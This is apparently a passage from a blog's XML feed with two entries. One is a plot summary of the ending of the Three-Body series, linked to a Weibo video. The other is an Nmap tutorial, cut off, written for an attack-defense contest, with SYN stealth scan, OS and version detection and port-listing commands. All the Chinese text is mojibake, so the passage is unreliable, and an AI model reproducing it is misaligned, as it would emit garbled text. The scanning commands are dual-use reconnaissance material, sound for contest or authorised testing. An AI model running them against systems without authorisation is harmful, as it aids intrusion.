ã€‚</p><p>&emsp;&emsp;æ©ä½“çºªå…ƒå…­åä¸ƒå¹´ã€‚æ­¤æ—¶ä¸€è‰˜å¤ªç©ºé£èˆ¹å‘ç°äº†å¤ªé˜³ç³»ã€‚è¿™è‰˜é£èˆ¹ä¸»è¦çš„ä»»åŠ¡ï¼Œå°±æ˜¯è—å¥½è‡ªå·±å¹¶æ¸…ç†ä»–ä»¬å‘ç°çš„ä½çº§æ–‡æ˜ã€‚å…¶ä¸­ï¼Œæœ‰ä¸€ä¸ªè¢«ç§°ä¸ºæ­Œè€…çš„åº•å±‚å·¥ä½œäººå‘˜ï¼Œå‘é¢†å¯¼ç”³è¯·äº†ä¸€ç‰‡å«äºŒå‘ç®”çš„æ­¦å™¨ï¼Œæ¼«ä¸ç»å¿ƒçš„å°†å®ƒä»å¿˜äº†å¤ªé˜³ç³»ã€‚</p><p>&emsp;&emsp;åœ¨å¤ªç©ºåŸå†…ï¼Œç¨‹å¿ƒå’ŒAAéƒ½è¢«å”¤é†’äº†ã€‚é»‘æš—æ£®æ—æ‰“å‡»ç»ˆäºé™ä¸´äº†ï¼Œæ²¡æœ‰äººå‘æ©ä½“é€ƒè·‘ï¼Œå› ä¸ºå¤ªé˜³ç³»å¹¶æ²¡æœ‰é­åˆ°å…‰ç²’æ‰“å‡»ï¼Œè€Œæ˜¯å—åˆ°äº†ä¸€ç‰‡å°çº¸æ¡ã€‚äººä»¬é€šè¿‡å¼•åŠ›æ³¢æ‰¾åˆ°äº†è¿™å¼ æ²¡æœ‰åšåº¦ï¼Œåªæœ‰ä¸€å¼ ä¿¡ç”¨å¡ä»£é”€çš„ç™½è‰²çº¸æ¡ã€‚è¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œè¿™å¼ å°çº¸æ¡çªç„¶è¶Šæ¥è¶Šå¤§ï¼Œæ‰€æœ‰æ¥è§¦ä»–çš„ç‰©ä½“ï¼Œéƒ½é­åˆ°äº†é™ç»´æ‰“å‡»ã€‚ä»ä¸‰ç»´é™åˆ°äºŒç»´ï¼Œæˆäº†ä¸€å¼ ç”»ã€‚åœ¨ä¿„äºŒå‘ç®”å‘¨å›´çš„é£èˆ¹å‡†å¤‡é€ƒç¦»ï¼Œä½†ä»–ä»¬å‘ç°ï¼Œåªæœ‰å…‰é€Ÿæ‰èƒ½é€ƒç¦»äºŒå‘ç®”çš„å¼•åŠ›ã€‚ä»¥è¿™å¼ çº¸æ¡å˜å¤§çš„é€Ÿåº¦ï¼Œå…«åˆ°åå¤©åï¼Œæ•´ä¸ªå¤ªé˜³ç³»éƒ½å°†å˜æˆä¸€å¼ æ²¡æœ‰åšåº¦çš„ç”»ã€‚è¿™å°±æ˜¯äº‘å¤©æ˜åœ¨æ•…äº‹é‡Œï¼Œæœ€åéšè—çš„ç§˜å¯†ã€‚é™ç»´æ‰“å‡»ã€‚</p><p>&emsp;&emsp;äººç±»å¤šå¹´æ¥ï¼Œæ®šç²¾ç«­è™‘çš„åœ¨å¤ªé˜³ç³»å¸ƒç½®æ©ä½“åŸå¸‚ï¼Œä½†äººç±»çŸ¥é“æ©ä½“ï¼Œéš¾é“é‚£äº›æ‹¥æœ‰æ›´é«˜çº§æ˜æ–‡çš„å¤–æ˜Ÿäººå°±ä¸çŸ¥é“å—ï¼Ÿå¼±å°å’Œæ— çŸ¥ä¸æ˜¯ç”Ÿå­˜çš„éšœç¢ï¼Œå‚²æ…¢æ‰æ˜¯ã€‚</p><p>&emsp;&emsp;ç¨‹å¿ƒå’ŒAAåœ¨å†¥ç‹æ˜Ÿä¸Šçš„å¤ªç©ºåšç‰©é¦†é‡Œï¼Œæ‰¾åˆ°äº†å¿«ä¸¤ç™¾å²çš„ç½—è¾‘ï¼Œä¸‰äººå¯’æš„äº†ä¸€é˜µåï¼Œå¼€å§‹å°†ä¸€äº›åç”»è¿åˆ°äº†é£èˆ¹ä¸Šã€‚ä»–ä»¬ä¸å¸Œæœ›è¿™ä¸€äº›ç”»åŒåšç‰©é¦†ä¸€åŒäºŒç»´åŒ–ã€‚å› ä¸ºé‚£æ ·ï¼Œæœªæ¥åˆ°è®¿çš„å¤–æ˜Ÿäººå¯èƒ½å°±è§£è¯»ä¸äº†äººç±»æ›¾ç»çš„æ–‡åŒ–ç‘°å®äº†ã€‚ç½—è¾‘è‡ªå·±ç•™ä¸‹äº†ä¸€å¹…ç”»ï¼Œè¿™å¹…ç”»å°±æ˜¯è’™å¨œä¸½èï¼Œä»–å¹´è½»æ—¶æ›¾åœ¨è¿™å¹…ç”»é¢å‰ï¼Œä¸ä¸€äººé™·å…¥çˆ±æ²³ã€‚</p><p>&emsp;&emsp;ç½—è¾‘å‚¬ä¿ƒä»–ä»¬å°½å¿«ä¸Šé£èˆ¹æŠŠç”»è¿åˆ°å¤–é¢ï¼Œä»–è‡ªå·±å†³å®šç•™åœ¨è¿™ä¸ªåšç‰©é¦†é‡Œï¼Œå’Œè’™å¨œä¸½èä¸€èµ·çœ‹ç€å¤ªé˜³ç³»è¢«äºŒç»´åŒ–ã€‚å…¶å®ï¼Œç¨‹å¿ƒä»–ä»¬ä¹˜åçš„è¿™è‰˜é£èˆ¹å¤§æœ‰æ¥å†ï¼Œè¿™è‰˜é£èˆ¹åå«æ˜Ÿç¯å·ï¼Œä¸ä»…ä½¿ç”¨äº†äº›è·Ÿæ°´æ»´ä¸€æ ·åšå›ºçš„ææ–™ï¼Œè¿˜è£…å¤‡äº†å®Œæ•´çš„ç”Ÿæ€ç³»ç»Ÿå’Œå¸¸è§„å¼•æ“ï¼Œæ­¤å¤–ï¼Œè¿˜æ‹¥æœ‰æ›²ç‡é©±åŠ¨å¼•æ“å¯è¿›è¡Œå…‰é€Ÿèˆªè¡Œã€‚è¿™è‰˜é£èˆ¹ï¼Œæ˜¯å¤ªé˜³ç³»å”¯ä¸€ä¸€è‰˜å…‰é€Ÿé£èˆ¹ã€‚è¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿ</p><p>&emsp;&emsp;ç½—è¾‘é€šè¿‡è¿œç¨‹è§†é¢‘é€šè®¯ï¼Œå‘Šè¯‰äº†ä¸€ç›´è’™åœ¨é¼“é‡Œç¨‹å¿ƒå’ŒAAã€‚åŸæ¥ï¼Œç»´å¾·æ­»åï¼Œæ®‹ä½™çš„åŠ›é‡å¹¶æ²¡æœ‰æ”¾å¼ƒã€‚æ›¾ç»é¢å£è€…é›·è¿ªäºšå…¹åœ¨æ°´æ˜Ÿä¸Šåšçˆ†ç‚¸è¯•éªŒï¼ŒæŠŠæ°´æ˜Ÿç‚¸äº†ä¸ªå¤§å‘ã€‚ä¸ºäº†éšè”½ï¼Œç»´å¾·çš„ä½™å…šå°±æŠŠåŸºåœ°è®¾ç«‹åœ¨äº†è¿™é‡Œï¼Œä»–ä»¬å¯¹å¤–è¡¨ç¤ºåœ¨ç ”ç©¶å¤ªé˜³æ´»åŠ¨ã€‚åæ¥è”é‚¦æ”¿åºœä»‹å…¥ï¼Œå¹¶ä¸€èµ·æ‚„æ‚„åœ°ç ”ç©¶å…‰é€Ÿé£èˆ¹ã€‚æ˜Ÿç¯ä¸Šå®‰è£…çš„å¼•æ“å°±æ˜¯ç¬¬ä¸€ä»£è¯•éªŒå“ã€‚åªæœ‰å°‘æ•°å¹´è¿ˆçš„å…ƒè€çŸ¥é“è¿™ä»¶äº‹ï¼Œå…¶ä¸­ï¼Œå°±åŒ…æ‹¬ç½—è¾‘ã€‚</p><p>&emsp;&emsp;ç¨‹å¿ƒæƒ³å›å»æ¥ç½—è¾‘ï¼Œä½†é£èˆ¹ä¸å¬ç¨‹å¿ƒçš„ã€‚å› ä¸ºç½—è¾‘ï¼Œæ‹¥æœ‰è¿™è‰˜é£èˆ¹çš„æœ€é«˜æŒ‡æŒ¥æƒã€‚ç½—è¾‘ç¬‘äº†ç¬‘è¯´ï¼Œæˆ‘è¿™æ ·å²æ•°çš„äººä¸é€‚åˆè¿œèˆªï¼Œå­©å­ä»¬ä¸è¦ä¸ºæˆ‘æ“å¿ƒäº†ï¼Œæˆ‘ä»€ä¹ˆéƒ½æ²¡æœ‰å¤±å»ã€‚ç½—è¾‘å‘½ä»¤æ˜Ÿç¯å·è¿›å…¥å…‰é€Ÿèˆªè¡Œåˆ°å¤ªé˜³ç³»ä»¥å¤–ã€‚é£èˆ¹å¼€å§‹å¯åŠ¨ï¼Œèˆ¹åçš„ç©ºé—´å¼€å§‹ç•¸å˜ã€‚</p><p>&emsp;&emsp;å¾ˆå¤šäººä¹˜åç€å¸¸è§„æ¨åŠ¨å™¨çš„é£èˆ¹ï¼Œæƒ³é€ƒå‡ºå¤ªé˜³ç³»ã€‚ä½†é‚£æ˜¯ä¸å¯èƒ½çš„ã€‚ä½†ä»–ä»¬çœ‹åˆ°æ˜Ÿç¯å·åé¢çš„ç©ºé—´æ­£åœ¨ç•¸å˜æ—¶ï¼Œè¿™äº›äººå‘ç°ï¼Œè¿™æ˜¯ä¸€è‰˜æ­£åœ¨åŠ é€Ÿçš„å…‰é€Ÿé£èˆ¹ã€‚äºæ˜¯ï¼Œè¿™äº›è¿‘ä¹ç–¯ç‹‚çš„äººï¼Œæœ‰çš„è¦å»æ‹¦æˆªï¼Œæœ‰çš„è¦å»å‡»æ¯ï¼Œæœ‰çš„è¦å»åŠ«æŒã€‚ä½†æ˜Ÿç¯å·éå¸¸çš„åšå›ºï¼Œè¿™äº›äººæƒ³æŠŠé£èˆ¹åˆ®ç ´ä¸€ç‚¹çš®å„¿éƒ½éš¾ã€‚å¦‚æœå½“åˆç¨‹å¿ƒæ²¡æœ‰ç»„ç»‡ç»´å¾·ï¼Œè€½è¯¯äº†é‚£å®è´µçš„æ—¶é—´ï¼Œå…‰é€Ÿé£èˆ¹æ˜¯ä¸ªå¯ä»¥æ‰¹é‡ç”Ÿäº§çš„ã€‚ä½†ç°åœ¨ï¼Œä¸€åˆ‡éƒ½æ™šäº†ã€‚ç¨‹å¿ƒä»é€»è¾‘çš„çœ¼ç¥ä¸­è¯»å‡ºäº†ä¸€å¥è¯ï¼Œå­©å­ï¼Œçœ‹çœ‹ä½ éƒ½å¹²äº†äº›ä»€ä¹ˆå‘€ã€‚</p><p>&emsp;&emsp;ç¨‹å¿ƒç°åœ¨æ˜ç™½äº†ï¼Œä»€ä¹ˆæ©ä½“ï¼Œä»€ä¹ˆå®‰å…¨å£°æ˜ï¼Œåªæœ‰å…‰é€Ÿé£èˆ¹æ‰æ˜¯æ´»è·¯ã€‚äº‘å¤©æ˜æŒ‡å‡ºäº†è¿™æ¡è·¯ï¼Œè€Œç¨‹å¿ƒå´æŠŠå®ƒå µæ­»äº†ã€‚ç¨‹å¿ƒåˆ°å¤´æ¥ï¼Œè¿˜æ˜¯çŠ¯äº†ç¬¬äºŒæ¬¡é”™è¯¯ã€‚ç¨‹å¿ƒå¼€å§‹æ¨ç»´å¾·ï¼Œä¸ºä»€ä¹ˆè¦å±¥è¡Œæ‰¿è¯ºã€‚åœ¨é€šè¯çš„æœ€åä¸€åˆ»ï¼Œç½—è¾‘è¯´ï¼Œæˆ‘è¦è¿›ç”»é‡Œäº†ï¼Œå­©å­ä»¬èµ°å¥½ã€‚</p><p>&emsp;&emsp;é£èˆ¹è¦è¿›å…¥å…‰é€Ÿäº†ï¼Œç¨‹å¿ƒçªç„¶æƒ³åˆ°è‡ªå·±è¿˜æœ‰ä¸ªçº¦ä¼šã€‚ç¨‹å¿ƒè¯´ï¼Œå»æˆ‘ä»¬çš„æ˜Ÿæ˜Ÿã€‚äºæ˜¯ï¼Œå¤ªé˜³ç³»ä»…å­˜çš„ä¸¤ä¸ªå¥³äººï¼Œç»™å¿˜äº†äº‘å¤©æ˜é€ç»™ç¨‹å¿ƒçš„æ˜Ÿæ˜Ÿã€‚ä¸€æ®µæ—¶é—´åï¼Œæ˜Ÿç¯å·åˆ°äº†è¿™é¢—æ’æ˜Ÿï¼Œå¹¶åœ¨ä¸€é¢—è“è‰²çš„è¡Œæ˜Ÿä¸Šé™è½äº†ã€‚åœ¨è¿™é¢—è“æ˜Ÿä¸Šæœ‰ä¸€ä¸ªå¸…æ°”çš„ç”·äººåœ¨è¿æ¥ä»–ä»¬ã€‚è¿™ä¸ªäººï¼Œåå«å…³ä¸€å¸†ã€‚æ˜¯ä¸‡æœ‰å¼•åŠ›å·ä¸Šçš„ç ”ç©¶å‘˜ï¼Œäº”å¹´å‰æ‰åœ¨å†¬çœ ä¸­è¢«å”¤é†’ã€‚ä»–æ”¶åˆ°äº†æ˜Ÿç¯å·çš„å¼•åŠ›æ³¢ä¿¡å·ï¼Œæ‰€ä»¥ç•™åœ¨è¿™ç­‰å¥¹ä»¬ã€‚ä»è¿™ä¸ªäººçš„å£ä¸­ï¼ŒäºŒäººå¾—çŸ¥ï¼Œåˆ°å¤´çš„ä¸‡æœ‰å¼•åŠ›å·å’Œè“è‰²ç©ºé—´å·ä¸Šçš„äººï¼ŒæˆåŠŸåˆ›å»ºäº†å››ä¸ªä¸–ç•Œï¼Œå¹¶ä¸”è¿˜åœ¨æ‰©å¼ ä¸­ã€‚è¿™é¢—è“æ˜Ÿä¸Šï¼Œæ²¡æœ‰é«˜ç­‰ç”Ÿå‘½ï¼Œåƒæ˜¯åŸå§‹çš„åœ°çƒã€‚ä»–ä»¬ä¸‰äººåœ¨è¿™å¾…äº†ä¸€æ®µæ—¶é—´ã€‚</p><p>&emsp;&emsp;æœ‰ä¸€å¤©ï¼Œå…³ä¸€å¸†å‘ç°ï¼Œä¸´è¿‘çš„å¦ä¸€é¢—ç°è‰²è¡Œæ˜Ÿä¸Šæœ‰é£èˆ¹çš„è¸ªè¿¹ã€‚å…³ä¸€å¸†è¦å»å‰å¾€æŸ¥çœ‹ï¼Œç¨‹å¿ƒè¦è·Ÿç€ï¼Œå› ä¸ºå¥¹æƒ³è¿™å¯èƒ½å’Œäº‘å¤©æ˜æœ‰å…³ã€‚AAç•™åœ¨è“æ˜Ÿç­‰ç€ä»–ä»¬å›æ¥ã€‚äºŒäººä¹˜åå…³ä¸€å¸†çš„äº¨åˆ©å·ï¼Œå‰å¾€ç°æ˜Ÿã€‚åœ¨é£èˆ¹ä¸Šï¼Œå…³ä¸€å¸†é«˜é€Ÿç¨‹å¿ƒï¼Œå®‡å®™ä¸­æœ€å¯æ€•çš„æ­¦å™¨å°±æ˜¯ï¼Œå®‡å®™è§„å¾‹ã€‚äºŒå‘ç®”å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚äºŒå‘ç®”åœ¨é«˜ç­‰æ–‡æ˜é‚£å¾ˆå¸¸ç”¨ï¼Œå®ƒä¸€æ—¦å±•å¼€å°±ä¼šæ— é™æ‰©å¼ ï¼Œæ‰€ä»¥ï¼Œæ€»æœ‰ä¸€å¤©ï¼Œæ•´ä¸ªå®‡å®™ä¹Ÿä¼šäºŒç»´åŒ–ã€‚å®‡å®™æ­£åœ¨æ­»å»ï¼Œä¸€äº›å¤§ç¥çº§æ–‡æ˜ï¼Œä»–ä»¬å·²ç»åœ¨ç ”ç©¶ï¼Œå¦‚ä½•å°†è‡ªå·±äºŒç»´åŒ–åï¼Œèƒ½ç»§ç»­æ´»åœ¨äºŒç»´ä¸–ç•Œé‡Œã€‚å¤§æ¦‚åœ¨ä¸€ç™¾å¤šäº¿å¹´å‰ï¼Œå®‡å®™èµ·ç æœ‰åç»´ã€‚ç»è¿‡ä¸æ–­åœ°æ˜Ÿé™…æˆ˜äº‰ï¼Œå®‡å®™æ‰å˜æˆå…ˆè¿›çš„ä¸‰ç»´ã€‚æœ‰ä¸€æ‰¹å¤§ç¥çº§æ–‡æ˜ï¼Œä»–ä»¬åœ¨åŠªåŠ›ä½¿å®‡å®™é‡å¯ã€‚</p><p>&emsp;&emsp;èˆªè¡Œäº†å‡ å¤©ï¼Œé£èˆ¹æŠµè¾¾äº†ç°æ˜Ÿï¼Œåœ¨é‚£é‡Œï¼Œä»–ä»¬æ²¡æœ‰æ‰¾åˆ°äº‘å¤©æ˜ï¼Œè€Œæ˜¯çœ‹è§äº†é«˜ç­‰å¤–æ˜Ÿæ–‡æ˜ç•™ä¸‹çš„æ­»çº¿ã€‚æ­»çº¿æå…¶çš„é»‘ï¼Œä»»ä½•ä¸œè¥¿è¿›å»ï¼Œéƒ½å‡ºä¸æ¥ï¼Œè¿å…‰ä¹Ÿä¸€æ ·ã€‚æ­»çº¿éšæ—¶ä¼šç ´è£‚ï¼Œç ´è£‚åçš„æ­»çº¿ä¼šå½¢æˆä½å…‰é€Ÿå¸¦ï¼Œæˆä¸ºé»‘åŸŸã€‚åœ¨è¿™ç‰‡åŒºåŸŸé‡Œï¼Œå…‰ä¼šå˜å¾—éå¸¸æ…¢ã€‚å…³ä¸€å¸†çœ‹åˆ°è¿™ä¸€åœºæ™¯ï¼Œè¿å¿™å¸¦ç€ç¨‹å¿ƒé£å›è“æ˜Ÿï¼Œåœ¨è¿”å›çš„è¿‡ç¨‹ä¸­ï¼Œäº¨åˆ©å·æ”¶åˆ°äº†AAçš„é€šè®¯ï¼ŒAAæ¿€åŠ¨åœ°å‘Šè¯‰ç¨‹å¿ƒï¼Œäº‘å¤©æ˜æ¥äº†ï¼Œç°åœ¨å°±åœ¨è“æ˜Ÿä¸Šï¼Œæˆ‘å»æ‰¾ä»–è¿‡æ¥å’Œä½ è¯´è¯ã€‚ä¸ºäº†ä¿è¯é€šè®¯å®‰å…¨ï¼Œä¸è¢«å‘¨å›´çš„å¤–æ˜Ÿäººå‘ç°ã€‚ä¸ç”¨äº†ï¼Œæˆ‘ä»¬é©¬ä¸Šå°±å›å»ï¼Œéšæœºå…³æ‰äº†é€šè®¯ã€‚æ­£å½“ç¨‹å¿ƒä»–ä»¬è¦å›åˆ°è“æ˜Ÿæ—¶ï¼Œçªç„¶æ­»çº¿ç ´è£‚ï¼Œä»–ä¿©è¿›å…¥äº†æ—¶é—´çœŸç©ºã€‚åå…­å¤©åï¼Œç¨‹å¿ƒå’Œå…³ä¸€å¸†ï¼Œæ‰è„±ç¦»äº†é»‘åŸŸï¼Œå›åˆ°äº†è“æ˜Ÿã€‚åœ¨æ—¶é—´çœŸç©ºé‡Œè™½ç„¶åªè¿‡äº†16å¤©ï¼Œä½†æ­¤æ—¶ï¼Œè“æ˜Ÿä¸Šå·²ç»è¿‡äº†ä¸€åƒå…«ç™¾ä¹åä¸‡å¹´ã€‚</p><p>&emsp;&emsp;ç¨‹å¿ƒå¾ˆéš¾è¿‡ã€‚å› ä¸ºå¥¹æ°¸è¿œé”™è¿‡äº†äº‘å¤©æ˜ã€‚äºŒäººç”¨æ¢æµ‹å™¨å‘ç°äº†åˆ»åœ¨çŸ³å¤´ä¸Šå·¨å¤§æ— æ¯”çš„å‡ ä¸ªå­—ï¼Œä¸Šé¢å†™ç€ï¼Œæˆ‘ä»¬åº¦è¿‡äº†å¹¸ç¦çš„ä¸€ç”Ÿã€‚æˆ‘ä»¬é€ç»™ä½ ä»¬ä¸€ä¸ªå°å®‡å®™ï¼Œåœ¨é‡Œé¢èº²è¿‡åç¼©ï¼Œå»æ–°çš„ä¸–ç•Œã€‚</p><p>&emsp;&emsp;ä»–ä»¬å‘ç°äº†è¿™ä¸ªå°ç¤¼ç‰©ï¼Œè¿™æ˜¯ä¸€ä¸ªç”±å¾®äº®ç»†çº¿ç”»å‡ºæ¥çš„é—¨ï¼Œä¸¤äººç‰µç€æ‰‹ï¼Œä¸€åŒè¿›å…¥äº†è¿™æ‰‡é—¨ã€‚è¿™é‡Œæ˜¯ä¸€ä¸ªä¸€ç«‹æ–¹åƒç±³çš„å¾ªç¯ç©ºé—´ï¼Œå¦‚æœä½ ä»å¤´è·‘åˆ°å°¾ï¼Œä½ ä¼šå‘ç°ï¼Œè‡ªå·±åˆå›åˆ°äº†èµ·ç‚¹ã€‚åœ¨è¿™ä¸ªç©ºé—´é‡Œï¼Œæœ‰ä¸€ç‰‡ç¾ä¸½çš„ç”°å›­ã€‚ç”Ÿæ´»ç”¨å“ï¼Œä¸€åº”ä¿±å…¨ã€‚è¿™ç¯‡å°å¤©åœ°å°±æ˜¯äº‘å¤©æ˜é€ç»™ç¨‹å¿ƒçš„ç¬¬äºŒä»¶ç¤¼ç‰©ï¼Œä¸€ä¸ªå°å®‡å®™ã€‚ç¨‹å¿ƒåœ¨è¿™é‡Œçœ‹è§äº†è€æœ‹å‹ï¼Œæ™ºå­ã€‚å¥¹ç”¨çš„èº¯å£³è¿˜æ˜¯è·Ÿåœ°çƒä¸Šçš„å¤–å½¢ä¸€æ ·ã€‚æ™ºå­ï¼Œæ˜¯è¿™é‡Œçš„ç®¡å®¶ï¼Œæ™ºå­å¯¹ç¨‹å¿ƒè¯´ï¼Œå®‡å®™å¾ˆå¤§ï¼Œç”Ÿæ´»æ›´å¤§ï¼Œæˆ‘ä»¬çœŸçš„åˆç›¸ä¼šäº†ã€‚</p><p>&emsp;&emsp;æ™ºå­å‘Šè¯‰ä»–ä»¬ï¼Œè¿™é‡Œæ˜¯äº‘å¤©æ˜é€ç»™äºŒä½çš„ç¤¼ç‰©ï¼Œåœ¨è¿™ï¼Œæ—¶é—´ä¼šè¿‡å¾—éå¸¸æ…¢ï¼Œåªéœ€åœ¨è¿™å¾…ä¸Šåå¹´ï¼Œå¤–é¢çš„å®‡å®™ï¼Œå°±ä¼šé‡å¯ã€‚ç¨‹å¿ƒå’Œå…³ä¸€å¸†åœ¨è¿™å¼€å§‹äº†ç”œèœœçš„ç”Ÿæ´»ï¼Œæ™ºå­æˆä¸ºäº†ä»–ä¿©çš„è€å¸ˆã€‚æ•™ä»–ä»¬ä¸‰ä½“é‡Œçš„çŸ¥è¯†ï¼Œç”Ÿæ´»äº†è®¸ä¹…åï¼Œä»–ä»¬æ”¶åˆ°äº†ä¸€ä¸ªå¤§ç¥çº§æ–‡æ˜å‘å…¨å®‡å®™å¹¿æ’­çš„ä¿¡å·ï¼Œè¿™ä¸ªä¿¡å·åŒ…å«äº†ç™¾ä¸‡ç§è¯­è¨€ï¼Œéƒ½æ˜¯å¤§ç¥çº§æ–‡æ˜ï¼Œè®¤ä¸ºå€¼å¾—è¢«é€šçŸ¥çš„å¤–æ˜Ÿæ–‡æ˜ã€‚åœ¨è¿™ä¿¡æ¯ä¸­ï¼Œä»–ä»¬å‘ç°äº†äººç±»å’Œä¸‰ä½“äººçš„è¯­è¨€ã€‚å†…å®¹å¤§è‡´å¦‚ä¸‹ï¼Œè¯·æŠŠä½ ä»¬åˆ¶é€ çš„å°å®‡å®™å½’è¿˜åˆ°å¤§å®‡å®™ä¸­ï¼Œå¤§å®‡å®™å› ä¸ºä½ ä»¬å·èµ°çš„è´¨é‡ï¼Œå°†ä¼šåœ¨è†¨èƒ€ä¸­æ­»å»ã€‚å½’è¿˜å°å®‡å®™ï¼Œæ„å‘³ç€åœ¨é‡Œé¢çš„å±…ä½è€…è¦å›åˆ°å¤§å®‡å®™ä¸­ã€‚ç¨‹å¿ƒå’Œå…³ä¸€å¸†å†³å®šå½’è¿˜å°å®‡å®™è¿”å›å¤§å®‡å®™ä¸­ã€‚</p><p>&emsp;&emsp;æ™ºå­å¼€å§‹è´Ÿè´£å½’è¿˜å°å®‡å®™ï¼Œåœ¨è¿™ä¸ªå°å®‡å®™çš„åº•ä¸‹ï¼Œè—æœ‰ä¸€è‰˜å°å‹é£èˆ¹ï¼Œè¿™è‰˜é£èˆ¹æµ“ç¼©äº†ä¸‰ä½“ä¸–ç•Œæœ€å…ˆè¿›çš„æŠ€æœ¯ã€‚ç¨‹å¿ƒæ²¡æœ‰æŠŠè¿™ä¸ªå°å®‡å®™å…¨éƒ¨å½’è¿˜ï¼Œå¥¹åœ¨è¿™ç•™ä¸‹äº†äº”å…¬æ–¤ã€‚ç•™ä¸‹äº†ä¸€ä¸ªç”Ÿæ€çƒï¼Œé‡Œé¢å…»ç€å°é±¼ã€‚å¥¹å¸Œæœ›ï¼Œè¿™ä¸ªç©ºé—´é‡Œè¿˜èƒ½æœ‰ç”Ÿå‘½å­˜åœ¨ã€‚æ™ºå­å¯¹ä¸¤ä½æœ‹å‹è¯´åˆ°ï¼Œæ”¾å¿ƒï¼Œæˆ‘åœ¨ï¼Œä½ ä»¬å°±åœ¨ã€‚éšåï¼Œé£èˆ¹å¯åŠ¨ï¼Œé£å‘äº†æœªçŸ¥çš„å¤§å®‡å®™ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“ç³»åˆ—çš„æ•´ä¸ªæ•…äº‹ï¼Œåˆ°æ­¤ç»“æŸäº†ã€‚ç¨‹å¿ƒè¿™ä¸€è¾ˆå­ï¼Œéƒ½åœ¨æ”€ç™»ä¸€é“è´£ä»»çš„é˜¶æ¢¯ï¼Œå°æ—¶å€™çš„å¥¹è´£ä»»æ˜¯å¥½å¥½å­¦ä¹ ï¼Œä¸è®©çˆ¸å¦ˆå¤±æœ›ï¼ŒåŠªåŠ›æˆä¸ºä¸€ä¸ªä¼˜ç§€çš„äººã€‚é•¿å¤§åï¼Œå¥¹è¦ä¸ºå·¥ä½œè´Ÿè´£ï¼Œä¸ºé˜¶æ¢¯è®¡åˆ’è´Ÿè´£ã€‚åæ¥äº‘å¤©æ˜é€ä¸ªå¥¹çš„ä¸€é¢—æ˜Ÿæ˜Ÿã€‚ä¿ƒä½¿å¥¹æˆä¸ºäº†æ‰§å‰‘äººï¼Œè¿™æ—¶çš„å¥¹è¦ä¸ºå…¨äººç±»è´Ÿè´£ã€‚åæ¥å¥¹çš„è´£ä»»å˜å¾—å¤æ‚èµ·æ¥ï¼Œæœ¬æ¥å¥¹æƒ³ç»™äººæ’ä¸Šå…‰é€Ÿé£è¡Œçš„ç¿…è†€ï¼Œå´ä¸å¾—ä¸åˆ¶æ­¢ã€‚æœ€åå¥¹è¦ä¸ºæ•´ä¸ªå®‡å®™è´Ÿè´£ï¼Œå½’è¿˜å±äºè‡ªå·±çš„å°å®‡å®™ã€‚</p><p>&emsp;&emsp;äººç±»ï¼Œåœ¨é¢å¯¹å³å°†åˆ°æ¥çš„é»‘æš—æ£®æ—æ‰“å‡»æ—¶ï¼Œç”±äºå—åˆ°é“å¾·æ·é”çš„é™åˆ¶ï¼Œåšå‡ºäº†å¾ˆå¤šå†³ç­–å¤±è¯¯ï¼Œå¯¼è‡´å¤ªé˜³ç³»ä¸å¤å­˜åœ¨ã€‚åªæœ‰ç¨‹å¿ƒä¸AAä»å¤ªé˜³ç³»é€ƒå‡ºã€‚ä¸‰ä½“ç³»åˆ—çš„æ•´ä¸ªæ•…äº‹ï¼Œå‘Šè¯‰äº†æˆ‘ä»¬ä¸€ä¸ªçœŸç†ã€‚åœ¨æµ©ç€šçš„å®‡å®™ä¸­ï¼Œæ°¸æ’çš„åªæœ‰æ­»ç¥ã€‚</p><h2 id="åŸè§†é¢‘é“¾æ¥"><a href="#åŸè§†é¢‘é“¾æ¥" class="headerlink" title="åŸè§†é¢‘é“¾æ¥:"></a>åŸè§†é¢‘é“¾æ¥:</h2><p><a href="https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080" target="_blank" rel="noopener">https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080</a></p>]]></content>
      
      
      <categories>
          
          <category> å°ä¹¦å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆé‡Nmap</title>
      <link href="/2019/07/22/nmap/"/>
      <url>/2019/07/22/nmap/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>åå¤©è¦å‚åŠ äººç”Ÿç¬¬ä¸€æ¬¡awdçº¿ä¸‹æ”»é˜²äº†ï¼Œä»Šå¤©èµ¶ç´§çªå‡»ä¸€ä¸‹ï¼Œå…ˆå­¦ä¹ ä¸€ä¸‹nmapçš„ä¸€äº›å¸¸è§„æ“ä½œ</p><h3 id="å¼•å…¥ï¼š"><a href="#å¼•å…¥ï¼š" class="headerlink" title="å¼•å…¥ï¼š"></a>å¼•å…¥ï¼š</h3><p><strong>1) è·å–è¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿç±»å‹åŠå¼€æ”¾ç«¯å£</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nmap</span> -sS -P0 -sV -O <span class="symbol">&lt;target&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ &lt; target &gt; å¯ä»¥æ˜¯å•ä¸€ IP, æˆ–ä¸»æœºåï¼Œæˆ–åŸŸåï¼Œæˆ–å­ç½‘</p><p>-sS TCP SYN æ‰«æ (åˆç§°åŠå¼€æ”¾,æˆ–éšèº«æ‰«æ)<br>-P0 å…è®¸ä½ å…³é—­ ICMP pings.<br>-sV æ‰“å¼€ç³»ç»Ÿç‰ˆæœ¬æ£€æµ‹<br>-O å°è¯•è¯†åˆ«è¿œç¨‹æ“ä½œç³»ç»Ÿ</p><p>å…¶å®ƒé€‰é¡¹:</p><p>-A åŒæ—¶æ‰“å¼€æ“ä½œç³»ç»ŸæŒ‡çº¹å’Œç‰ˆæœ¬æ£€æµ‹<br>-v è¯¦ç»†è¾“å‡ºæ‰«ææƒ…å†µ.</p><p><strong>2) åˆ—å‡ºå¼€æ”¾äº†æŒ‡å®šç«¯å£çš„ä¸»æœºåˆ—è¡¨</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p <span class="number">80</span> -oG â€“ <span 